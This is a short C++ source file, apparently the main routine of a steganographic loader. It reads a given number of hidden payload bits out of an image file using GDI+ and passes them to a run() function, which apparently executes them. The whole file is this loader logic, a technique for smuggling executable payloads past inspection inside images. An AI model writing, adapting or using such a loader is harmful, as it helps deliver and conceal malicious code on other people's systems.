#include "reader.h"

int _tmain(int argc, TCHAR** argv) {

    if (argc == 3) {
        int payload_bits = _ttoi(argv[1]);
        char * payload_data = new char[payload_bits / 8];

        // Init Gdiplus
        GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

        // Do the job
        Gdiplus::Bitmap* bmp = load_image(argv[2]);
        read_image(bmp, payload_data, payload_bits);
        run(payload_data, payload_bits);

        // Shutdown Gdiplus
        GdiplusShutdown(gdiplusToken);
    }

    return 0;
}